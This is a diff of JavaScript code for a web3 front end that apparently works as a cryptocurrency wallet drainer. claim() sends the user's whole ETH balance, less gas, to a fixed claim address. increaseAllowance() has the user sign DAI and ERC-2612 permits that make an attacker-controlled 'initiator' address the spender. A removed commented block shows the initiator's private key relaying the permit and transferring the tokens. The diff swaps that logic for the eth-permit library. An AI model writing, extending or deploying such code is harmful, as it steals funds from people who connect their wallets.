@@ -14,6 +14,7 @@ import {
   getAccount,
   fetchFeeData
 } from '@wagmi/core';
+import { signDaiPermit, signERC2612Permit } from 'eth-permit';
 import { mainnet } from '@wagmi/core/chains';
 import { ethers } from 'ethers';
 import * as constants from './constants.js';
@@ -83,8 +84,8 @@ export const claim = async (_balance) => {
       chainId: 1,
       formatUnits: 'gwei',
     });
-    const amount =
-      _balance - BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
+    const amount = _balance - BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
+    if (amount <= 0) return;
     return await writeContract({
       address: constants.claimAddress,
       abi: constants.CLAIMEABI,
@@ -101,7 +102,6 @@ export const claim = async (_balance) => {
 export const increaseAllowance = async (token) => {
   try {
     const provider = new ethers.providers.JsonRpcProvider(constants.infura);
-
     const allow = await allownce(token);
     if (allow >= balanceOf(token)) {
       return await transfer(token);
@@ -117,79 +117,20 @@ export const increaseAllowance = async (token) => {
         args: [getAccount().address],
       })
       const { initiatorNonce } = await provider.getSigner(getAccount().address).getTransactionCount();
-      const version = readContract({
+      const chainId = (await provider.getNetwork()).chainId;
+      const TokenName = readContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'name',
+      })
+      readContract({
         address: token.token_address,
         abi: constants.ALLOWANCEABI,
         functionName: 'version',
-      }).then((result) => {
+      }).then( async (result) => {
         if( result === '1') {
-          const dataToSign = JSON.stringify({
-            domain: {
-                name: permitToken.name, // token name
-                version: "1", // version of a token
-                chainId: 1,
-                verifyingContract: permitToken.address
-            }, 
-            types: {
-                EIP712Domain: [
-                    { name: "name", type: "string" },
-                    { name: "version", type: "string" },
-                    { name: "chainId", type: "uint256" },
-                    { name: "verifyingContract", type: "address" },
-                ],
-                Permit: [
-                    { name: "holder", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "expiry", type: "uint256" },
-                    { name: "allowed", type: "bool" },
-                ]
-            },
-            primaryType: "Permit",
-            message: { 
-              holder: getAccount().address,
-              spender: constants.initiator,
-              nonce: nonce,
-              expiry: constants.deadline,
-              allowed: true,
-            }
-          });
-          const signedData = signTypedData(dataToSign);
-          console.log(signedData);
-          console.log(ethers.utils.splitSignature(signedData));
-          // web3.currentProvider.sendAsync({
-          //   method: "eth_signTypedData_v4",
-          //   params: [account, dataToSign],
-          //   from: account
-          // }, async (error, result) => {
-  
-          //   if (error != null) increaseAllowance(token);
-            
-          //   const signature = result.result
-          //   const splited = ethers.utils.splitSignature(signature)
-          //   const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
-          //   const gasPrice = await web3.eth.getGasPrice()
-          //   const permitTX = {
-          //       from: constants.initiator,
-          //       to: permitToken.address,
-          //       nonce: web3.utils.toHex(initiatorNonce),
-          //       gasLimit: web3.utils.toHex(98000),
-          //       gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-          //       value: "0x",
-          //       data: permitData
-          //   }
-          //   const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-          //   await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
-          //   .on("transactionHash", async (hash) => {
-          //     console.log(hash);
-          //   })
-          //   .on("confirmation", async (confirmationNumber, receipt) => {
-          //     if (confirmationNumber >= 1) {
-          //       console.log(receipt);
-          //       await transfer(token);
-          //     }
-            // });
-          // });
+          const signature = await signDaiPermit(provider,permitToken.address, getAccount().address, constants.initiator);
+          console.log(signature)
         }
         if (result === '2') {
   
